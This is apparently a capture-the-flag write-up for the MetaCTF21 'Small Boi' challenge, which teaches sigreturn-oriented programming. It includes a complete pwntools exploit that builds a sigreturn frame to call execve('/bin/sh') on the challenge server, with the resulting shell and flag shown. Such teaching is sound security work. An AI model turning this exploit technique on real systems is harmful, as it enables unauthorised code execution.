# Small Boi

The description for this challenge is as follows:

 *With a program this small, there isn't a chance you can find an exploit... right? Here's the Little Boi.*

*host1.metaproblems.com 5460*

*Note: No data is printed to start this challenge, and the Segmentation faults are part of the challenge*

This challenge had 56 solves by the end, and it was worth 275 points. I did not find it particularly difficult, but it provides a great, simple example of the SIGROP/SROP technique. 

**TL:;DR Solution:** Note that this binary gives us very few gadgets, but it does include full control of rax and a syscall. When combined with the presence of a '/bin/sh' string within the binary, this presents a fairly straightforward opportunity to use SIGROP to execute execve(/bin/sh, 0, 0).

## Gathering Information

When I attempt to run the binary, very little really happens. I am presented with no input prompt, and I simply enter some data, which segfaults the program.
```
knittingirl@piglet:~/CTF/metaCTF21$ ./little
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```
If I use checksec, I can see that there are at least very few protections; pretty much the only thing in place is NX. NX essentially means that code on the stack is non-executable, so I will not be able to use shellcode unless I carve out an RWX segment myself using some other technique.
```
knittingirl@piglet:~/CTF/metaCTF21$ checksec little
[*] '/home/knittingirl/CTF/metaCTF21/little'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
The next step is to open the program up in Ghidra. For this particular binary, the only function listed is _start, and the view in the decompilation windows is nearly useless. As a result, I need to rely heavily on reading the assembly, which is quite short. Basically, a stack location is getting pushed, then popped into the rsi register. Then 0 is getting pushed, the popped, into both rdi and rax. 0x800 is moved into the edx register, then there is a syscall. T

In x86-64 binaries, the function called by syscall is determined by the value in the rax register. The first three arguments to that function are then passed in the rdi, rsi, and rdx registers. You can keep track of which functions are referenced by a given syscall, as well as some details on their arguments, by looking at a syscall table like this one: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

```
        00401000 54              PUSH       RSP=>local_8
        00401001 5e              POP        RSI
        00401002 6a 00           PUSH       0x0
        00401004 6a 00           PUSH       0x0
        00401006 5f              POP        RDI
        00401007 58              POP        RAX
        00401008 ba 00 08        MOV        EDX,0x800
                 00 00
        0040100d 0f 05           SYSCALL
        0040100f c3              RET

```
In this case, rax is being set to 0, which indicates a read call. This makes sense given the program's behavior. If I double-check how the read function works by looking at the man page, I can see that the first argument is the file descriptor that it is reading from, the second argument is the buffer that it is reading to, and the third argument is the number of characters that the read can take. Here, rdi is 0, which is the file descriptor for stdin, the second argument is a variable in the stack that I will be reading into, and the third argument of 0x800 means that I can read in up to 0x800 characters.
```
SYNOPSIS
       #include <unistd.h>

       ssize_t read(int fd, void *buf, size_t count);

DESCRIPTION
       read()  attempts to read up to count bytes from file descriptor fd into
       the buffer starting at buf.
```

## Planning the Exploit: 

Some very basic testing of the binary indicates that my first character already overflows the return pointer, so I have a clear ROP-based exploit with 0x800 bytes of payload available to me. The only potential problem is the lack of gadgets. ROPgadget detects a grand total of 10, all of which seem to be derived from that _start function. In addition, since no libc functions are used, no ret2libc approach is available.
```
knittingirl@piglet:~/CTF/metaCTF21$ ROPgadget --binary little
Gadgets information
============================================================
0x000000000040100b : add byte ptr [rax], al ; syscall
0x0000000000401009 : add byte ptr [rax], cl ; add byte ptr [rax], al ; syscall
0x0000000000401005 : add byte ptr [rdi + 0x58], bl ; mov edx, 0x800 ; syscall
0x0000000000401008 : mov edx, 0x800 ; syscall
0x0000000000401010 : nop ; ret
0x0000000000401007 : pop rax ; mov edx, 0x800 ; syscall
0x0000000000401006 : pop rdi ; pop rax ; mov edx, 0x800 ; syscall
0x0000000000401004 : push 0 ; pop rdi ; pop rax ; mov edx, 0x800 ; syscall
0x000000000040100f : ret
0x000000000040100d : syscall

Unique gadgets found: 10
```
Fortunately, the gadget at 0x0000000000401007 will provide me with both a pop rax, which grants me full control of that register, and a syscall. This is all that I need for a technique known as SIGROP. Basically, there is a syscall function known as a sigreturn that is called when rax is set to 0xf. When a sigreturn is called, it takes the current stack frame (i.e. the next few bytes on the stack after the syscall gadget) and loads them into all of the registers. This helpfully gives us access to all of the registers; specifically, control of rax, rip, rdi, rsi, and rdx will let us call effectively any system that we want, including execve. To clarify, rip, the return instruction pointer, can specify where the program starts executing next, so by setting it to a syscall gadget, I can call another syscall with rax and other registers filled with whatever I want.

The main hiccup to calling execve typically that it needs to called with a pointer to the string command that we want to execute, which is most typically /bin/sh. Fortunately, the exports section in ghidra references binsh; if I click on it, then click the address that it is referencing, I can see the string /bin/sh in a static location that I can easily load into rdi. I could also find this information by looking at the defined strings tab, again within Ghidra. 

![freesteam exe extraction](/home/knittingirl/CTF/metaCTF21/binsh_string_ghidra.png)

## Writing the Exploit:

One approach that I have taken when attempting to conceptualize how this technique works is appending the pwntools cyclic pattern after the syscall and seeing what gets loaded into the registers after making the call. For illustrative purposes, I will show that here. Here is the script that you can use to generate this result:
```
from pwn import *

target = process('./little')

pid = gdb.attach(target, "\nb *0x0040100f\n set disassembly-flavor intel\ncontinue")

syscall = p64(0x000000000040100d)
syscall_pop_rax = p64(0x0000000000401007)

padding = b''
payload = padding
payload += syscall_pop_rax
payload += p64(0xf)
payload += cyclic(300)

target.sendline(payload)

target.interactive()
```
And once I step down past the sigreturn in my ROPchain, here is what the registers look like in the GEF wrapper for GDB:
```
Program received signal SIGSEGV, Segmentation fault.
0x6261617362616172 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x6261616962616168 ("haabiaab"?)
$rcx   : 0x6261616f6261616e ("naaboaab"?)
$rdx   : 0x6261616b6261616a ("jaabkaab"?)
$rsp   : 0x6261617162616170 ("paabqaab"?)
$rbp   : 0x6261616762616166 ("faabgaab"?)
$rsi   : 0x6261616562616164 ("daabeaab"?)
$rdi   : 0x6261616362616162 ("baabcaab"?)
$rip   : 0x6261617362616172 ("raabsaab"?)
$r8    : 0x6161616c6161616b ("kaaalaaa"?)
$r9    : 0x6161616e6161616d ("maaanaaa"?)
$r10   : 0x616161706161616f ("oaaapaaa"?)
$r11   : 0x6161617261616171 ("qaaaraaa"?)
$r12   : 0x6161617461616173 ("saaataaa"?)
$r13   : 0x6161617661616175 ("uaaavaaa"?)
$r14   : 0x6161617861616177 ("waaaxaaa"?)
$r15   : 0x6261617a61616179 ("yaaazaab"?)
```
This clarifies the fact that specific offsets in my stack frame get pushed into specific registers. Theoretically, I could use this debugger information to figure out the offsets needed to fill each register. Fortunately, pwntools provides an easier method; it can automatically create a sigreturn frame, and the contents of individual registers can then be filled with lines like "frame.rsi = 0". So, all I have to do is make my sigreturn, follow it with a sigreturn frame in which rax = 0x3b (for execve), rdi = '/bin/sh' string, rsi and rdx are 0, and rip = a syscall gadget. Here is an exploit script that does just that:
```
from pwn import *

#target = process('./little')

#pid = gdb.attach(target, "\nb *0x0040100f\n set disassembly-flavor intel\ncontinue")

target = remote('host1.metaproblems.com', 5460)


syscall = 0x000000000040100d
syscall_pop_rax = p64(0x0000000000401007)
binsh = 0x00402000

padding = b''
payload = padding

payload += syscall_pop_rax
payload += p64(0xf)

# Specify the architecture
context.arch = "amd64"

frame = SigreturnFrame()

frame.rip = syscall
frame.rdi = binsh 
frame.rax = 59
frame.rsi = 0
frame.rdx = 0

payload += bytes(frame)
print(bytes(frame))

target.sendline(payload)

target.interactive()
```
Here is what my registers look like in GEF if I run it locally and debug:
```
$rax   : 0x3b              
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x0               
$rbp   : 0x0               
$rsi   : 0x0               
$rdi   : 0x0000000000402000  →  0x0068732f6e69622f ("/bin/sh"?)
$rip   : 0x000000000040100d  →  <_start+13> syscall 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x0               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0 
```
And here is the result against the live target:
```
knittingirl@piglet:~/CTF/metaCTF21$ python3 little_payload.py 
[+] Opening connection to host1.metaproblems.com on port 5460: Done
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 @\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x10@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
$ ls
flag.txt
little
little.sh
$ cat flag.txt
MetaCTF{5i9nAL5_3v3rYwH3r3}
```
Thanks for reading!
